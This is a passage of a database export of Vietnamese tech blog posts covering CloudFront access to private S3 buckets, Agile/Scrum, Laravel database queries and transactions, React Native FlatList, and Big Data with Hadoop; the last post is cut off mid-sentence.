XXXXXXXXXXXX"\n  },\n  "Action": "s3:GetObject",\n  "Resource": "arn:aws:s3:::sample-s3-ntd/*"\n },\n```\n\nĐây chính là phần mà ta thêm vào sau khi lựa chọn option `Grant Read Permissions on Bucket` là `Yes, Update Bucket Policy` (tức là khi nãy, nếu lựa chọn `I will Update Permissions` thì ta sẽ phải thêm cụm trên vào policy cho S3 bucket bằng tay).\n\nThêm nữa, vừa nãy khi chọn `Origin Access Identity`, ta đã chọn `Create a New Identity` - trên thực tế, các Origin có thể dùng lại một OAI user đã có, vì vậy ta sẽ có thêm option `Use an Existing Identity` khi tạo các Origin hay hay Distribution tiếp theo)\n\n## Ngoài lề 2: gắn `content_disposition` và `content_type` cho CloudFront's signed_url\n\nCái ghi chú thứ 2 này là dành cho các bạn code Ruby, tuy nhiên các ngôn ngữ khác thì cơ chế cũng giống vậy.\n\nThực tế là đối với hệ thống của mình, file lưu trên S3 không hề chứa tên thật cũng như phần extension của file; thay vào đó, những thứ này sẽ lưu trong DB. Và theo logic trước đây của mình, khi tạo `signed_url` bằng S3, mình sẽ bao gồm cả 2 thứ `content_disposition` và `content_type` khi generate `S3 signed_url`. Lúc này thì link trả về cho client sẽ chứa 2 cái header `content_disposition` và `content_type`, 2 cái này mới là thứ quy định tên file hiển thị trên web cũng như tên file khi download.\n\nGiờ khi chuyển sang sử dụng `CloudFront signed_url`, ta cũng có thể chứa 2 cái option kia vậy, tuy nhiên cách implement hơi khác 1 chút.\n\nMình có thể impelement một đoạn code như sau:\n\n```\nsigner = Aws::CloudFront::UrlSigner.new(\n  key_pair_id: "cf-keypair-id",               # Access Key ID mình vừa tạo ra ban nãy.\n  private_key_path: "./cf_private_key.pem"    # file chứa private_key đi kèm.\n)\n\ncontent_disposition = "attachment; #{format_file_name(file)}"   # Hàm thực hiện generate ra chuỗi content_disposition\ncontent_type = content_mime_type(file)                          # Hàm lấy ra content_type của file\nfile_path = generate_file_path(file)                            # generate ra đường dẫn của file trên S3\nurl = "#{cloud_front_domain}/#{file_path}?response-content-disposition=#{CGI.escape content_disposition}&response-content-type=#{CGI.escape content_type}"\n\nsigner.signed_url(url,  expires: Time.current.to_i + 30)\n\n```	Bài toán\n\nOk, hiện tại thì hệ thống mà mình đang làm đang sử dụng AWS S3 để lưu file và nội dung mà user lưu trữ. Cho đến một ngày đẹp trời, khách hàng tự dưng có yêu cầu: Chuyển việc trích xuất và lấy các tài nguyên lưu trên S3 đó - thay vì lấy trực tiếp từ S3 - thì sẽ chuyển sang lấy thông qua CloudFront. Tất nhiên là họ cũng có lý do:\n- Khách hàng có phát triển một app, trong đó có nhúng Web...	{https://images.viblo.asia/aa124ac1-bfec-4f6f-96e4-726c5de629ef.png,https://images.viblo.asia/adef2040-ab70-4293-a0a6-b7fdd6e0fcc1.png,https://images.viblo.asia/e93f8c61-ce51-44a4-beac-ba1249c7feca.png,https://images.viblo.asia/40f381f6-e9e2-490f-8b4c-7934125622c1.png,https://images.viblo.asia/829be315-5296-41b6-b1f7-9e5d6169560b.png,https://images.viblo.asia/ea057bd0-ef65-43b0-8179-3724046d7426.png,https://images.viblo.asia/8ce35931-4de0-4e4c-8e4f-511cbb644f95.png,https://images.viblo.asia/ffd898bc-88e2-47b1-acec-17cef0e9acb6.png,https://images.viblo.asia/b7c43994-6843-4523-8883-8a7287d90578.png,https://images.viblo.asia/4029640c-dfbc-4856-822d-ca69574eade8.png,https://images.viblo.asia/ea823d67-f8e6-4ae7-b628-a64aca827efa.png}	1	Sử dụng Amazon CloudFront để truy cập tới một private Amazon S3 Bucket	{amazon-s3,amazon-web-services-aws}	0	f	2022-12-18 15:33:37.522+00	2022-12-18 15:33:37.522+00
31851	Đa phần mỗi người khi học về CNTT đều từng nghe qua về một số mô hình phát triển phần mềm như: Mô hình thác nước (Waterfall),  V-Model, Xoắn ốc, mô hình tăng trưởng, mô hình phát triển lặp, mô hình Agile-Scrum... Hôm nay mình sẽ giới thiệu với mọi người mô hình Agile-Scrum - một mô hình phát triển phần mềm đang được sử dụng phổ biến hiện nay tại các công ty CNTT.\n## 1. Agile\n![](https://images.viblo.asia/43b2bda4-53d3-492c-a33f-b743b359e267.png)\n### 1.1. Agile là gì?\nAgile là tập hợp các phương thức phát triển lặp và tăng dần trong đó các yêu cầu và giải pháp được phát triển thông qua sự liên kết cộng tác giữa các nhóm tự quản và liên chức năng. Agile là cách thức làm phần mềm linh hoạt để đưa ra sản phẩm đến tay người dùng các sớm càng tốt. Sau đó khách hàng sẽ dùng thử và phản hồi lại để đội ngũ phát triển tiếp tục làm ở các giai đoạn tiếp theo.Tùy từng dự án mà thời gian release ra sản phẩm có thể dài hoặc ngắn.<br>\nAgile hoạt động dựa trên 4 tuyên ngôn sau:\n1. **Cá nhân và sự tương hỗ** quan trọng hơn quy trình và công cụ.\n2. **Sản phẩm dùng được** quan trọng hơn tài liệu về sản phẩm.\n3. **Cộng tác với khách hàng** quan trọng hơn đàm phán hợp đồng.\n4. **Phản hồi với sự thay đổi** quan trọng hơn bám theo kế hoạch.\n### 1.2. Ưu điểm\n- Khách hàng được tham gia vào quá trình phát triển và có thể thấy được một phần của sản phẩm sau mỗi giai đoạn => đưa ra phản hồi.\n- Người kiểm thử tham gia vào ngay từ đầu => phát hiện lỗi sớm.\n- Rút ngắn thời gian phát triển vì mô hình này chia dự án thành các phần nhỏ để phát triển.\n- Đáp ứng kịp thời nếu có sự thay đổi.\n- Tăng cường tinh thần làm việc nhóm.\n### 1.3. Nhược điểm\n- Luôn lắng nghe ý kiến của khách hàng với những thay đổi => thời gian có thể bị kéo dài.\n- Khó khăn trong việc xác định ngân sách và thời gian.\n- Không chú trọng vào thiết kế và tài liệu.\n### 1.4. Ứng dụng\nThường được áp dụng cho những dự án có nhiều thay đổi, chưa có yêu cầu rõ ràng.\n## 2. Scrum\n### 2.1. Scrum là gì?\nScrum là một trong những phương pháp phổ biến nhất để thực thi mô hình Agile (Tỉ lệ được sử dụng 52% trên tổng số các phương pháp).\n* Đối với scrum dự án được chia thành nhiều giai đoạn nhỏ để thực hiện hay còn gọi là Sprint.\n* Mỗi Sprint thường kéo dài từ 1 tuần đến 4 tuần.\n* Đầu sprint sẽ lên kế hoạch làm những công việc gì. Cuối sprint là 1 sản phẩm có thể demo và chạy được.\n* Hoàn thành sprint 1, tiếp tục làm sprint 2, ... cho đến khi hoàn thành hết các yêu cầu.\n* Hàng ngày cả team sẽ có 1 cuộc họp, các thành viên sẽ báo cáo hôm qua tôi đã làm gì? Hôm nay tôi sẽ làm gì? Và có gặp khó khăn gì không?<br>\n![](https://images.viblo.asia/2ce3d413-2a04-4657-b67e-d7c39f39bddc.png)<br>\n### 2.2. Các vai trò trong Scrum\nCó 3 vai trò chính:\n* **Product Owner (PO):** Là người đại diện của khách hàng đưa ra những yêu cầu của sản phẩm, hiểu rõ nhất về sản phẩm và cũng là người tiếp nhận đầu ra, đánh giá kết quả của dự án.\n* **Scrum Master:** Là người thiết lập các cuộc họp trong giai đoạn phát triển. Là người hỗ trợ, định hướng cho team đảm bảo mọi người đang thực hiện đúng theo tiến trình. Scrum master còn giải quyết các vấn đề cản trở ảnh hưởng đến tiến độ công việc.\n* **Scrum Team:** Bao gồm cả developer, QA. Team sẽ tổ chức và quản lý công việc nhằm hoàn thành sản phẩm đề ra trong mỗi giai đoạn và đưa cho khách hàng. Mọi người trong team luôn hỗ trợ lẫn nhau.\n### 2.3. Các cuộc họp trong Scrum\nCó 4 cuộc họp quan trọng trong mỗi sprint như sau:\n* **Sprint Planning:** Mọi người trong team sẽ gặp nhau, trao đổi yêu cầu của khách hàng và lập kế sẽ làm gì trong sprint tới.\n* **Daily Scrum Meeting:** Cuộc họp sẽ kéo dài khoảng 15 phút, mọi thành viên sẽ trả lời các câu hỏi: Hôm qua tôi làm gì? Hôm nay tôi sẽ làm gì? Có gặp khó khăn gì không? \n* **Sprint Review Meeting:** Kết thúc mỗi sprint team và PO sẽ đánh giá và quyết định những công việc nào đã hoàn thành, những công việc nào chưa hoàn thành. Team sẽ trình bày và demo ra những gì họ đã làm được trong sprint đó để khách hàng có thể đưa ra những phản hồi.\n* **Sprint Retrospective meeting:** Mọi người họp và đưa ra những điểm tốt trong sprint này và những điểm chưa tốt để rút kinh nghiệm, và đưa ra những giải pháp cho các sprint tiếp theo.\n### 2.4. Các yếu tố nòng cốt trong Scrum\n![](https://images.viblo.asia/98c5faed-5705-4685-aebd-18e894ac2de7.jpg)<br>\nCó 3 yếu tố nòng cốt trong Scrum là:\n* **Minh bạch:** Mọi kế hoạch và công việc của các thành viên tất cả mọi người đều phải biết và công khai kể cả PO.\n* **Thanh tra:** Phải thường xuyên thanh tra kiểm soát tiến độ công việc của mình xem đã hoàn thành đến đâu rồi có phát hiện điều gì bất thường không để kịp thời xử lý, đảm bảo tiến độ công việc.\n* **Thích nghi**: Là đảm bảo rằng khi có một vấn đề mới hay có sự thay đổi nào từ phía khách hàng thì mọi người trong team sẽ có thể xử lý và đáp ứng theo cách thích hợp. Luôn phải thích nghi trọng mọi hoàn cảnh.<br><br>\n\nHi vọng bài viết sẽ giúp ích cho các bạn!!!<br>\nTài liệu tham khảo<br>\nhttps://vntesters.com/tuyen-ngon-cua-agile/\nhttps://vi.wikipedia.org/wiki/Scrum_(m%C3%B4_h%C3%ACnh_ph%C3%A1t_tri%E1%BB%83n_ph%E1%BA%A7n_m%E1%BB%81m)	Đa phần mỗi người khi học về CNTT đều từng nghe qua về một số mô hình phát triển phần mềm như: Mô hình thác nước (Waterfall),  V-Model, Xoắn ốc, mô hình tăng trưởng, mô hình phát triển lặp, mô hình Agile-Scrum... Hôm nay mình sẽ giới thiệu với mọi người mô hình Agile-Scrum - một mô hình phát triển phần mềm đang được sử dụng phổ biến hiện nay tại các công ty CNTT.\n1. Agile\n\n1.1. Agile là gì?\nAgi...	{https://images.viblo.asia/43b2bda4-53d3-492c-a33f-b743b359e267.png,https://images.viblo.asia/2ce3d413-2a04-4657-b67e-d7c39f39bddc.png,https://images.viblo.asia/98c5faed-5705-4685-aebd-18e894ac2de7.jpg}	1	Giới thiệu về mô hình phát triển phần mềm Agile/Scrum	{agile,scrum}	0	f	2022-12-18 15:33:37.679+00	2022-12-18 15:33:37.679+00
32038	## Running Raw SQL Queries\nMột khi bạn đã cấu hình và connect database đến cơ sở dữ liệu thành công bạn nên chạy query sử dụng DB facade. DB facade cung cấp sẵn cho bạn những method cho từng loại query như: `select`, `update`, `insert`, `delete`, `statement`\n### Running A Select Query\nĐể chạy một query cơ bản, bạn nên sử dụng `select` method trong DB facade\n```\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Support\\Facades\\DB;\nuse App\\Http\\Controllers\\Controller;\n\nclass UserController extends Controller\n{\n    /**\n     * Show a list of all of the application's users.\n     *\n     * @return Response\n     */\n    public function index()\n    {\n        $users = DB::select('select * from users where active = ?', [1]);\n\n        return view('user.index', ['users' => $users]);\n    }\n}\n```\nTham số đầu tiên của `select` method là một query raw SQL (một đoạn SQL thuần), tham số thứ hai là một mảng những tham số được binding ràng buộc với query. Thông thường đây là những values được ràng buộc ở điều kiện where. Những dữ liệu binding này sẽ được xử lý để tránh SQL injection.\n\n`select` method sẽ trả về một mảng data. Mỗi kết quả trong mảng sẽ là một PHP stdClass object, cho phép bạn có thể truy cập được values của từng mảng data như sau:\n```\nforeach ($users as $user) {\necho $user->name;\n}\n```\n### Using Named Bindings\nThay vì sử dụng `?` để thể hiện data binding, bạn có thể thực thi query sử dụng named bindings:\n```\n$results = DB::select('select * from users where id = :id', ['id' => 1]);\n```\n### Running An Insert Statement\nĐể thực thi insert statement, bạn nên sử dụng `insert` method của DB facade. Giống như `select`, method này cũng cần một raw SQL cho tham số đầu tiên, và binding giá trị ràng buộc ở tham số thứ hai:\n```\nDB::insert('insert into users (id, name) values (?, ?)', [1, 'Dayle']);\n```\n### Running An Update Statement\n`update` method được sử dụng để update một hoặc nhiều record đã tồn tại trong database. Số bản ghi được update sẽ được trả về khi thực thi:\n```\n$affected = DB::update('update users set votes = 100 where name = ?', ['John']);\n```\n### Running A Delete Statement\n`delete` method được sử dụng để xóa những bản ghi trong database. Giống như `update`, kết quả trả về khi thực thi sẽ là số bản ghi đã được xóa:\n```\n$deleted = DB::delete('delete from users');\n```\n### Running A General Statement\nMột số database statement không trả về giá trị gì khi thực thi, đối với loại hành động này, bận nên sử dụng `statement` method của DB facade:\n```\nDB::statement('drop table users');\n```\n## Listening For Query Events\nNếu bạn muốn nhận được những SQL query được thực thi trong ứng dụng của mình, bạn nên sử dụng `listen` method. Method này được sử dụng để ghi log query hoặc để debug. Bạn nên đăng ký query listenter trong `service provider`:\n```\n<?php\n\nnamespace App\\Providers;\n\nuse Illuminate\\Support\\Facades\\DB;\nuse Illuminate\\Support\\ServiceProvider;\n\nclass AppServiceProvider extends ServiceProvider\n{\n    /**\n     * Register any application services.\n     *\n     * @return void\n     */\n    public function register()\n    {\n        //\n    }\n\n    /**\n     * Bootstrap any application services.\n     *\n     * @return void\n     */\n    public function boot()\n    {\n        DB::listen(function ($query) {\n            // $query->sql\n            // $query->bindings\n            // $query->time\n        });\n    }\n}\n```\n## Database Transactions\nBạn nên sử dụng `transaction` method trong DB facade để chạy một tập hợp các hành động trong một phiên làm việc (database transaction).  Nếu có lỗi exception được thrown trong transaction `closure`, transaction này sữ tự động rollback tất cả những hoạt động đã thực thị trước đó. Nếu `Closure` thực thi thành công, transaction sẽ được commit tự động kết quả. Bạn nên lo lắng về việc rollback hay commit manually khi sử dụng `transaction` method:\n```\nDB::transaction(function () {\n    DB::table('users')->update(['votes' => 1]);\n\n    DB::table('posts')->delete();\n});\n```\n### Handling Deadlocks\n`transaction` method chấp nhận tham số mở rộng thứ hai để định nghĩa số lần thực thi transaction khi xảy ra deadlock. Khi đã vượt quá số lần được cho phép, một exception sẽ được thrown:\n```\nDB::transaction(function () {\n    DB::table('users')->update(['votes' => 1]);\n\n    DB::table('posts')->delete();\n}, 5);\n```\n### Manually Using Transactions\nNếu bạn muốn bắt đầu transaction một các manually và có toàn quyền control tất cả những hoạt động commit cũng như rollback, bạn nên sử dụng `beginTransaction` method của `DB` facade:\n```\nDB::beginTransaction();\n```\nBạn có thể rollback transaction thông qua `rollBack` method:\n```\nDB::rollBack();\n```\nCuối cùng, bạn có thể commit transaction thông qua `commit` method:\n```\nDB::commit();\n```\n> `transaction` method của DB facade  có thể control transactions cho cả query builder và Eloquent ORM\n## References document\nhttps://laravel.com/docs/5.8/database#running-queries	Running Raw SQL Queries\nMột khi bạn đã cấu hình và connect database đến cơ sở dữ liệu thành công bạn nên chạy query sử dụng DB facade. DB facade cung cấp sẵn cho bạn những method cho từng loại query như: select, update, insert, delete, statement\nRunning A Select Query\nĐể chạy một query cơ bản, bạn nên sử dụng select method trong DB facade\nTham số đầu tiên của select method là một query raw SQL ...	{}	1	Giới thiệu về database queries và transactions	{laravel}	0	f	2022-12-18 15:33:37.688+00	2022-12-18 15:33:37.688+00
32039	Rất cảm ơn tất cả các bạn đã đọc và ủng hộ cho bài viết trước về FlatList Component trong React Native\n\n[Cách sử dụng FlatList Component trong React Native (Phần 1)](https://viblo.asia/p/cach-su-dung-flatlist-component-trong-react-native-phan-1-yMnKMNLmZ7P)\n\nTiếp tục seri về FlatList Components, lần này mình xin tiếp tục giới thiệu chi tiết về các method được support trong nó.\n\n## Separator\nVí dụ bạn không sử dụng separator trong ứng dụng của bạn, và giờ bạn muốn sử dụng nó nhưng bạn không biết làm sao để thêm vào top hoặc bottom của list. Bạn có thể thêm borderBottom trên mọi element ngoài trừ phần tử đầu tiền hoặc bạn có thể dùng thuộc tính *ItemSeparatorComponent* giúp xử lý tất cả các logic cho bạn.\n\nTrong ví dụ này, điều đầu tiên bạn cần là remove tất cả các border trong app.\n``` js\nrender() {\n  return (\n    <List \n+      containerStyle={{ borderTopWidth: 0, borderBottomWidth: 0 }}\n    >\n      <FlatList\n        data={this.state.data}\n        renderItem={({ item }) => (\n          <ListItem\n            roundAvatar\n            title={`${item.name.first} ${item.name.last}`}\n            subtitle={item.email}\n            avatar={{ uri: item.picture.thumbnail }}\n+            containerStyle={{ borderBottomWidth: 0 }}\n          />\n        )}\n        keyExtractor={item => item.email}\n      />\n    </List>\n  );\n}\n```\n\nBạn muốn tạo separator component. Nó rất đơn giản nhưng thay vì toàn bộ chiều rộng của màn hình, nó sẽ bắt đầu (khoảng) nơi đoạn text được xuất hiện.\n\n```js\nclass FlatListDemo extends Component {\n  // ...\n\n  renderSeparator = () => {\n    return (\n      <View\n        style={{\n          height: 1,\n          width: "86%",\n          backgroundColor: "#CED0CE",\n          marginLeft: "14%"\n        }}\n      />\n    );\n  };\n\n  // ...\n}\n```\n\nvà sau đó bạn có thể tiếp tục và sử dụng nó bằng cách thêm *ItemSeparatorComponent={this.renderSeparator}* từ FlatList component.\n\n```js\nrender() {\n  return (\n    <List containerStyle={{ borderTopWidth: 0, borderBottomWidth: 0 }}>\n      <FlatList\n        ...\n        ItemSeparatorComponent={this.renderSeparator}\n      />\n    </List>\n  );\n}\n```\n\nDanh sách hiển thị sẽ hiển thị như bên dưới. Lưu ý rằng ở đầu và cuối list, separator không được hiển thị.\n\n![](https://images.viblo.asia/798d2f35-8ade-4b0e-8108-d1a69460f213.gif)\n\n## Header\n\nRender một component ở đầu danh sách sẽ scroll với nội dung khi bạn scroll xuống danh sách dễ như thêm separator. Để thực hiện điều này, bạn sẽ sử dụng SearchBar component từ React Native.\n\nĐầu tiên tạo một function mới render từ component của bạn muốn trong header.\n\n```js\nclass FlatListDemo extends Component {\n  ...\n\n  renderHeader = () => {\n    return <SearchBar placeholder="Type Here..." lightTheme round />;\n  };\n\n  ...\n}\n\n```\n\nSau đó bạn muốn thực sự render header đó bằng cách sử dụng thuộc tính *ListHeaderComponent* trong FlatList.\n\n```js\nrender() {\n  return (\n    <List containerStyle={{ borderTopWidth: 0, borderBottomWidth: 0 }}>\n      <FlatList\n        ...\n        ItemSeparatorComponent={this.renderSeparator}\n        ListHeaderComponent={this.renderHeader}\n      />\n    </List>\n  );\n}\n```\n\n![](https://images.viblo.asia/f2988bc3-03e6-4c32-82cb-622916384b55.gif)\n\n## Footer\n\nFooter rất giống với Header, chỉ là nó ở cuối danh sách chứ không phải là đầu. Footer này sẽ phức tạp hơn một chút so với ví dụ trước  nhưng áp dụng các nguyên tắc tương tự. Đầu tiên tạo method gọi footer và trả về component.\n\n```js\nclass FlatListDemo extends Component {\n  ...\n\n  renderFooter = () => {\n    if (!this.state.loading) return null;\n\n    return (\n      <View\n        style={{\n          paddingVertical: 20,\n          borderTopWidth: 1,\n          borderColor: "#CED0CE"\n        }}\n      >\n        <ActivityIndicator animating size="large" />\n      </View>\n    );\n  };\n\n  ...\n}\n```\n\nSau đó gọi funtion từ `ListFooterComponent`\n\n```js\nrender() {\n  return (\n    <List containerStyle={{ borderTopWidth: 0, borderBottomWidth: 0 }}>\n      <FlatList\n        ...\n        ListHeaderComponent={this.renderHeader}\n        ListFooterComponent={this.renderFooter}\n      />\n    </List>\n  );\n}\n```\n\nDanh sách hiển thị sẽ hiển thị như sau (Bạn có thể thấy *ActivityIndicator*).\n\n![](https://images.viblo.asia/75ec32ec-b1cf-4c3c-bcb0-f30227487df3.gif)\n\n## Kết\nVậy là chúng ta đã tìm hiểu được những khái niệm cơ bản của FlatList.\n\nThông qua bài này hi vọng mọi người hình dung được các thành phần trong 1 app sử dụng FlatList.\n\n## Tài liệu tham khảo\nhttps://medium.com/react-native-development/how-to-use-the-flatlist-component-react-native-basics-92c482816fe6	Rất cảm ơn tất cả các bạn đã đọc và ủng hộ cho bài viết trước về FlatList Component trong React Native\n\nCách sử dụng FlatList Component trong React Native (Phần 1)\n\nTiếp tục seri về FlatList Components, lần này mình xin tiếp tục giới thiệu chi tiết về các method được support trong nó.\n\nSeparator\nVí dụ bạn không sử dụng separator trong ứng dụng của bạn, và giờ bạn muốn sử dụng nó nhưng bạn không...	{https://images.viblo.asia/798d2f35-8ade-4b0e-8108-d1a69460f213.gif,https://images.viblo.asia/f2988bc3-03e6-4c32-82cb-622916384b55.gif,https://images.viblo.asia/75ec32ec-b1cf-4c3c-bcb0-f30227487df3.gif}	1	Cách sử dụng FlatList Component trong React Native (Phần 2)	{flatlist,flatlist-react-native,react-native}	0	f	2022-12-18 15:33:37.796+00	2022-12-18 15:33:37.796+00
31983	# I. Big Data là gì?\n\n* Big Data không chỉ đơn giản nói đến khối lượng dữ liệu lớn mà còn nói đến tốc độ dữ liệu và tính đa dạng của dữ liệu. \n* Khi chúng ta có một khối lượng dữ liệu hợp lý, chúng ta thường sử dụng các CSDL quan hệ truyền thống như Oracle, MySQL, SQL Server để lưu trữ và làm việc.\n* Tuy nhiên khi chúng ta có khối lượng data lớn sẽ không thể sử dụng các CSDL truyền thống để làm việc được nữa.\n\n![](https://images.viblo.asia/1756c6e0-d47f-4d10-a540-1120debf2b15.png)\n\n* Những CSDL truyền thống sẽ làm việc tốt với cấu trúc data được lưu trữ dưới dạng dòng và cột. Còn những data không có cấu trúc thì khi tạo quan hệ trong CSDL thì sẽ khó mà chính xác được\n* Với big data có tính đa dạng dữ liệu thì một lượng lớn dữ liệu có thể có ở bất kỳ định dạng nào như image,flat files, audio,... có cấu trúc và định dạng không giống nhau giữa các records thì cũng khó để quản lý bởi các database truyền thống.\n* Đặc trưng của Big data là:\n       Volume \n       Velocity \n       Variety.\n\n![](https://images.viblo.asia/40c34f3f-8b21-4741-87d0-dc3157dce669.png)\n\n# II. Ứng dụng của Big data trên thực tế\n\n## 1. E-commerce\n\n* Amazon, Flipkart và những trang thương mại khác có hàng triệu khách truy cập mỗi ngày với hàng trăm ngàn sản phẩm. Amazon đã sử dụng big data để làm thông tin lưu trữ sản phẩm, khách hàng và đặt hàng.\n* Ngoài ra còn thu thập xung quanh các tìm kiếm sản phẩm, views, sản phẩm đã được thêm vào giỏ hàng, giỏ hàng bị loại, các sản phẩm được mua cùng nhau, ... \n* Tất cả data này được lưu trữ và xử lý theo thứ tự đề xuất sản phẩm mà khách hàng yêu thích nhất khi mua.\n* Nếu bạn mởi 1 trang sản phẩm, bạn có thể nhìn thấy action này ở dưới : “Frequently bought together”, “Customers who bought this item also bought” and “Customers who viewed this item also viewed”. Các thông tin này được sử dụng để recommend deals / discounts và xếp hạng sản phẩm trong kết quả tìm kiếm\n![](https://images.viblo.asia/0b086eff-ec66-4f86-8c23-0be2406a06c0.jpg)\n* Tất cả các dữ liệu này phải được xử lý rất nhanh, điều này không khả thi với CSDL truyền thống.\n\n## 2. Social Media\n\n* Các trang social media thường chứa lượng data khổng lồ về pictures, videos, likes, posts, comments,... Không chỉ được lưu trữ trên nền tảng big data, nó còn có thể xử lý và phân tích để đưa ra các đề xuất trên nội dung mà người dùng yêu thích.\n![](https://images.viblo.asia/b4dec05a-db51-432b-a70b-0a8c61176ef3.png)\n* Không chỉ lưu trữ data ngoài ra còn có thể xử lý và phân tích để đưa ra những đề xuất mà người dùng hứng thú.\nVí dụ: \nKhi bạn search cụm từ "SamSung" trên Amazon và di chuyển đến facebook. Trên facebook sẽ hiển thị quảng cáo cho những cái tương tự.\n\n* Đây là một trường hợp sử dụng big data vì có hàng triệu trang web quảng cáo trên facebook và hàng tỷ người dùng. \n* Lưu trữ và xử lý  thông tin này để hiển thị quảng cáo phù hợp cho đúng user có nhu cầu, không thể thực hiện bằng CSDL truyền thống trong cùng một khoảng time.\n* Mục tiêu đúng khách hàng và đúng quảng cáo là rất quan trọng vì người mà tìm kiếm SamSung sẽ thích thú để click vào những quảng cáo của SamSung hơn là những quảng cáo của Apple.\n\n## III. Format data trong Big Data\n\n### Có 1 câu hỏi đã được đặt ra ngay từ đầu là "Vì sao chúng ta không thể sử dụng CSDL truyền thống cho big data". \n\nĐể trả lời câu hỏi trên đầu tiên chúng ta cần nắm format của big data là gì?\n\nFormat của big data được phân thành 3 loại: \n\n![](https://images.viblo.asia/bb87a19e-5dcb-45a2-b159-18d0873dd56c.png)\n### 1. Structured Data\n  -  Liên quan đến các dữ liệu được tổ chức ở mức cao\n  -  Được lưu trữ dễ dàng trong bất cứ database nào\n  -  Có thể dễ dàng lấy/ tìm kiếm dữ liệu bằng cách sử dụng các câu query đơn giản.\n\n### 2. Semi Structured Data\n- Không được tổ chức chặt chẽ \n- Thường không được lưu trữ trong database.\n- Có thể lưu trữ database quan hệ sau khi được xử lý và convert sang định dạng có cấu trúc.\n\n### 3. Unstructured data\n- Không có xác định cụ thể format\n- Nó không theo mô hình dữ liệu có cấu trúc\n- Images, Videos, documents, mp3 có thể được coi là Unstructured data mặc dù chúng có cấu trúc bên trong.\n- Có tới 80% data được tạo ra trong một tổ chức là phi cấu trúc.\n\n### Vậy các CSDL truyền thống không thể hỗ trợ cho big data bởi vì\n\n* Các CSDL truyền thống như Oracle, MySQL, SQL Server không thể sử dụng cho big data bởi vì hầu hết dữ liệu là Unstructured data\n* Đa dạng dữ liệu: Dữ liệu có thể là images, video, pictures, text, audio, ... Dữ liệu này không thể lưu trữ dưới dạng cột và dòng của RDBMS (Relational Database Management System) \n* Khối lượng data được lưu trữ của big data là khổng lồ. Dữ liệu này cần được xử lý nhanh và điều này đòi hỏi dữ liệu phải được xử lý song song . Việc xử lý song song dữ liệu trong RDBMS sẽ rất tốn kém và không hiệu quả.\n* CSDL truyền thống không được xây dựng để lưu trữ và xử lý data với khối lượng lớn/ kích thước lớn.\nVí dụ: hình ảnh trên facebook, dữ liệu cho google map,...\n* Vận tốc tạo dữ liệu: \nCSDL truyền thống không thể lưu trữ hoặc truy xuất cho những data có tốc độ tạo ra nhanh như là:  6000 tweet được tạo ra mỗi giây, 510.000 bình luận được tạo ra mỗi phút. \n\n# IV. Chiến lượt thực hiện test big data applications\n![](https://images.viblo.asia/973ba9e1-bee7-41e3-a698-d308ba0f099d.png)\n\n## 1. Hadoop là gì?\n* Là một Apache framework mã nguồn mở được viết bằng java, cho phép xử lý phân tán (distributed processing) các tập dữ liệu lớn trên các cụm máy tính (clusters of computers) thông qua mô hình lập trình đơn giản. \n* Hadoop được thiết kế để mở rộng quy mô từ một máy chủ đơn sang hàng ngàn máy tính khác có tính toán và lưu trữ cục bộ (local computation and storage).\n\n## 2. Hướng dẫn cách cài đặt hadoop trên windows\nhttps://www.youtube.com/watch?v=LUhSv06qrdA\n\n## 3. Hadoop hoạt động như thế nào?\n### Giai đoạn 1\n* Một user hay một ứng dụng có thể submit một job lên Hadoop (hadoop job client) với yêu cầu xử lý cùng các thông tin cơ bản\n* Nơi lưu (location) dữ liệu input, output trên hệ thống dữ liệu phân tán.\n* Các java class ở định dạng jar chứa các dòng lệnh thực thi các hàm map và reduce.\n* Thiết lập cụ thể liên quan đến job thông qua các thông số truyền vào.\n\n### Giai đoạn 2\n* Hadoop job client submit job (file jar, file thực thi) và các thiết lập cho JobTracker.\n*  Sau đó, master sẽ phân phối tác vụ đến các máy slave để theo dõi và quản lý tiến trình các máy này, đồng thời cung cấp thông tin về tình trạng và chẩn đoán liên quan đến job-client.\n\n### Giai đoạn 3\n* TaskTrackers trên các node khác nhau thực thi tác vụ MapReduce và trả về kết quả output được lưu trong hệ thống file.\n* Khi “chạy Hadoop” có nghĩa là chạy một tập các daemon, hoặc các chương trình thường trú, trên các máy chủ khác nhau trên mạng của bạn. \n* Những daemon có vai trò cụ thể, một số chỉ tồn tại trên một máy chủ, một số có thể tồn tại trên nhiều máy chủ.\n* Các daemon bao gồm:  NameNode, DataNode, SecondaryNameNode, JobTracker, TaskTracker\n\n## 4. Cấu trúc Hadoop \n![](https://images.viblo.asia/2632efa0-4e2a-4f31-9dd3-8b49d741e33d.png)\n\n* Biểu đồ trên thể hiện cấu trúc của Hadoop. Mỗi node (Client, Master Node, Slave Node) đại diện cho một máy.\n* Hadoop được cài đặt trên các máy client và kiểm soát công việc bằng cách tải cluster data, submit Map Reduce job và cấu hình xử lý của data.\n* Tât cả các máy được tạo thành 1 cluster. Có thể có nhiều cluster trong network.\n\n![](https://images.viblo.asia/e3658d69-a748-4452-8c41-ec1d3f9f2003.png)\n\n* Master Nodes có 2 vai trò chính: \n     \n     Đầu tiên là chúng xử lý lưu trữ phân tán dữ liệu bằng NameNodes. \n     \n     Thứ hai là xử lý song song của dữ liệu (MapReduce) được điều phối bởi JobTracker. \n* Các NameNode thứ cấp sẽ hoạt động như NameNode dự phòng.\n* Slave nodes tạo thành các máy chủ. Chúng lưu trữ và xử lý dữ liệu. Mỗi Slave nodes sẽ có Data Node và Task Tracker.\n* Data Node là slave nhận các hướng dẫn từ NameNodes và thực hiện lưu trữ dữ liệu như bên dưới\n\n![](https://images.viblo.asia/8615c2f8-0024-4a7e-939c-7a63b88d48c3.png)\n\n* TaskTracker là slave nhận các hướng dẫn từ JobTracker. Nó xử lý dữ liệu bằng MapReduce, đây là 1 quá trình gồm 2 bước như dưới\n![](https://images.viblo.asia/5b08d763-a57c-4063-b0c6-49e7ccc9aa21.png)\n\nChuỗi events của xử lý Reduce được hiển thị như dưới.\n![](https://images.viblo.asia/b0337d51-b0bc-4de2-9808-20186efb1fb5.png)\n\n# V. Kết luận\nBig data đã và đang là một trong những vấn đề trung tâm, nhận được nhiều sự quan tâm trong cuộccách mạng công nghiệp lần thứ tư. \n\nBig data chính là cốt lõi để sử dụng, phát triển internet vạn vật (IoT) vàtrí tuệ nhân tạo (AI). \n\nTheo dự báo, cách mạng công nghiệp lần thứ tư sẽ tạo ra một lượng lớn dữ liệu, dự kiến đến năm 2020, lượng dữ liệu sẽ tăng gấp 50 lần hiện nay \n\nThông qua thu thập, phân tích và xử lý lượng big data này sẽ tạo ra những tri thức mới, hỗ trợ việc 